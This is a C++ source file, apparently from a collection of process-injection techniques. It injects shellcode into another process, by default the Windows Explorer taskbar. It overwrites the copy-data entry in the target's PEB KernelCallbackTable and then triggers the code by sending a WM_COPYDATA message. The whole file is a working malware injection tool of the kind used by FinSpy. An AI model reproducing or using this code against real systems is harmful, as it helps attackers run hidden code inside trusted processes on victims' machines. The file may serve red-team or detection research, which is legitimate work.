/**
* Injects shellcode into a process by overwriting the copy data kernel callback table entry and then sending a WM_COPYDATA window message to the process.
* Supports 32- and 64 Bit applications.
* [Requirements]
*	- the target process must own a window
* Based on: https://modexp.wordpress.com/2019/05/25/windows-injection-finspy/
*/

#include <Windows.h>
#include <iostream>

#include "../common/ntddk.h"
#include "../payload/shellcode.hpp"

int main(int argc, char* argv[])
{
	char* targetWindow = "Shell_TrayWnd";
	
	if (argc == 2)
	{
		targetWindow = argv[1];
	}
	
	HWND windowHandle = FindWindowA(targetWindow, NULL);
	if (!windowHandle)
	{
		printf("[Error] %d - Failed to find window %s\n", GetLastError(), targetWindow);
		return 1;
	}

	DWORD processId;
	GetWindowThreadProcessId(windowHandle, &processId);

	HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
	if (!processHandle)
	{
		printf("[Error] %d - Failed to OpenProcess explorer.exe\n", GetLastError());
		return 1;
	}

	printf("[Info] - Acquired process handle %p\n", processHandle);

	PROCESS_BASIC_INFORMATION processInformation;
	NTSTATUS error = NtQueryInformationProcess(processHandle, ProcessBasicInformation, &processInformation, sizeof(processInformation), NULL);
	if (error)
	{
		printf("[Error] %d - Failed to query process basic information\n", GetLastError());
		return 1;
	}

	PEB peb;
	if (!ReadProcessMemory(processHandle, processInformation.PebBaseAddress, &peb, sizeof(peb), nullptr))
	{
		printf("[Error] %d - Failed to read PEB\n", GetLastError());
		return 1;
	}

	LPVOID remoteShellcodeMemory = VirtualAllocEx(processHandle, NULL, sizeof(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!remoteShellcodeMemory)
	{
		printf("[Error] %d - Failed to allocate shellcode buffer in target process\n", GetLastError());
		return 1;
	}

	if (!WriteProcessMemory(processHandle, remoteShellcodeMemory, shellcode, sizeof(shellcode), nullptr))
	{
		printf("[Error] %d - Failed to write shellcode to the target process\n", GetLastError());
		return 1;
	}

	printf("[Info] - Wrote shellcode to remote process at %p\n", remoteShellcodeMemory);

	// the first entry in the callback table is the copy data callback. Overwrite it with a pointer to our shellcode.
	DWORD oldProtection;
	if (!VirtualProtectEx(processHandle, peb.KernelCallbackTable, sizeof(remoteShellcodeMemory), PAGE_EXECUTE_READWRITE, &oldProtection))
	{
		printf("[Error] %d - Failed to modify page protection of kernel callback table\n", GetLastError());
		return 1;
	}
	if (!WriteProcessMemory(processHandle, peb.KernelCallbackTable, &remoteShellcodeMemory, sizeof(void*), nullptr))
	{
		printf("[Error] %d - Failed to modify kernel callback table entry in target process\n", GetLastError());
		return 1;
	}
	if (!VirtualProtectEx(processHandle, peb.KernelCallbackTable, sizeof(remoteShellcodeMemory), oldProtection, &oldProtection))
	{
		printf("[Error] %d - Failed to restore page protection of kernel callback table\n", GetLastError());
		return 1;
	}

	printf("[Info] - Modified COPYDATA callback in kernel callback table\n");
	printf("[Info] - Executing shellcode by sending a WM_COPYDATA message to the window\n");

	// execute payload by sending a WM_COPYDATA window message and therefore executing the copy data callback
	COPYDATASTRUCT copyData = COPYDATASTRUCT();
	SendMessageA(windowHandle, WM_COPYDATA, (WPARAM)windowHandle, (LPARAM)&copyData);

	// cleanup
	VirtualFreeEx(processHandle, remoteShellcodeMemory, 0, MEM_RELEASE);
	CloseHandle(processHandle);

	return 0;
}